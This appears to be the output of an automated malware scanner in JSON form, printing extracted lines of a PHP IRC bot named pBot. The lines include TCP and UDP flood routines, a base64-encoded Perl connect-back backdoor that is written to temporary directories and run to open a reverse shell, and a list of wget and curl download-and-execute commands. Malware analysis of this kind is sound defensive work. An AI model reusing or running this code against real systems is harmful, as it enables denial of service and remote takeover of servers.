            "\t$this->privmsg($this->config['chan'],\"[\\2UdpFlood SeLsAi!\\2]: $env MB enviados / Media: $vel MB/s \");",
            " function tcpflood($host,$packets,$packetsize,$port,$delay) ",
            "    $this->privmsg($this->config['chan'],\"[\\2TcpFlood Started!\\2]\"); ",
            "    $packet = \"\"; ",
            "    for($i=0;$i<$packetsize;$i++) ",
            "       $packet .= chr(mt_rand(1,256)); ",
            "    for($i=0;$i<$packets;$i++) ",
            "    { ",
            "       if(!$fp=fsockopen(\"tcp://\".$host,$port,$e,$s,5)) ",
            "       { ",
            "          $this->privmsg($this->config['chan'],\"[\\2TcpFlood\\2]: Error: <$e>\"); ",
            "          return 0; ",
            "       } ",
            "       else ",
            "       { ",
            "          fwrite($fp,$packet); ",
            "          fclose($fp); ",
            "       } ",
            "       sleep($delay); ",
            "    } ",
            "    $this->privmsg($this->config['chan'],\"[\\2TcpFlood SelSai!\\2]: Config - $packets pacotes para $host:$port.\"); ",
            " function conback($ip,$port)",
            "    $this->privmsg($this->config['chan'],\"[\\2conback\\2]: konek ke $ip:$port\");",
            "    $dc_source = \"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KcHJpbnQgIkRhdGEgQ2hhMHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQppZiAoISRBUkdWWzBdKSB7DQogIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogIGV4aXQoMSk7DQp9DQpwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KJGhvc3QgPSAkQVJHVlswXTsNCiRwb3J0ID0gODA7DQppZiAoJEFSR1ZbMV0pIHsNCiAgJHBvcnQgPSAkQVJHVlsxXTsNCn0NCnByaW50ICJbKl0gQ29ubmVjdGluZy4uLlxuIjsNCiRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3AnKSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0Kc29ja2V0KFNFUlZFUiwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCm15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KaWYgKCFjb25uZWN0KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogIGRpZSgiVW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KfQ0KcHJpbnQgIlsqXSBTcGF3bmluZyBTaGVsbFxuIjsNCmlmICghZm9yayggKSkgew0KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOw0KICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgb3BlbihTVERFUlIsIj4mU0VSVkVSIik7DQogIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow0KICBleGl0KDApOw0KfQ0KcHJpbnQgIlsqXSBEYXRhY2hlZFxuXG4iOw==\";",
            "    if (is_writable(\"/tmp\"))",
            "    {",
            "      if (file_exists(\"/tmp/dc.pl\")) { unlink(\"/tmp/dc.pl\"); }",
            "      $fp=fopen(\"/tmp/dc.pl\",\"w\");",
            "      fwrite($fp,base64_decode($dc_source));",
            "      passthru(\"perl /tmp/dc.pl $ip $port &\");",
            "      unlink(\"/tmp/dc.pl\");",
            "    }",
            "    else",
            "    {",
            "    if (is_writable(\"/var/tmp\"))",
            "    {",
            "      if (file_exists(\"/var/tmp/dc.pl\")) { unlink(\"/var/tmp/dc.pl\"); }",
            "      $fp=fopen(\"/var/tmp/dc.pl\",\"w\");",
            "      fwrite($fp,base64_decode($dc_source));",
            "      passthru(\"perl /var/tmp/dc.pl $ip $port &\");",
            "      unlink(\"/var/tmp/dc.pl\");",
            "    }",
            "    if (is_writable(\".\"))",
            "    {",
            "      if (file_exists(\"dc.pl\")) { unlink(\"dc.pl\"); }",
            "      $fp=fopen(\"dc.pl\",\"w\");",
            "      fwrite($fp,base64_decode($dc_source));",
            "      passthru(\"perl dc.pl $ip $port &\");",
            "      unlink(\"dc.pl\");",
            "    }",
            "    }",
            "$bot = new pBot; ",
            "$bot->start(); "
        ],
        "file": {},
        "fuzzing": {
            "Possible connections": [
                "exec(\"wget \".$url[2].\" -O \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
                "exec(\"cUrl -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
                "shell_exec(\"wget \".$url[2].\" -O \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
                "shell_exec(\"cUrl -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
                "system(\"wget \".$url[2].\" -O \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
                "system(\"cUrl -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
                "passthru(\"wget \".$url[2].\" -O \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
                "passthru(\"cUrl -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
                "exec(\"wget \".$url[2].\" -O /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
                "exec(\"cUrl -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
                "shell_exec(\"wget \".$url[2].\" -O /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
                "shell_exec(\"cUrl -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
                "system(\"wget \".$url[2].\" -O /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
                "system(\"cUrl -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
                "passthru(\"wget \".$url[2].\" -O /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
                "passthru(\"cUrl -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
                "exec(\"wget \".$url[2].\" -O /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
                "exec(\"cUrl -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
                "shell_exec(\"wget \".$url[2].\" -O /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
                "shell_exec(\"cUrl -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
                "system(\"wget \".$url[2].\" -O /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
                "system(\"cUrl -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
                "passthru(\"wget \".$url[2].\" -O /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
                "passthru(\"cUrl -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");"
            ]
        },
        "ip": [
            "127.0.0.1"
        ],
        "url": [
            "http://your.host/file",
            "http://mxxx.webng.com/icon.txt",
            "http://"
        ]
    },
    "time": "0:00:00.634352",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
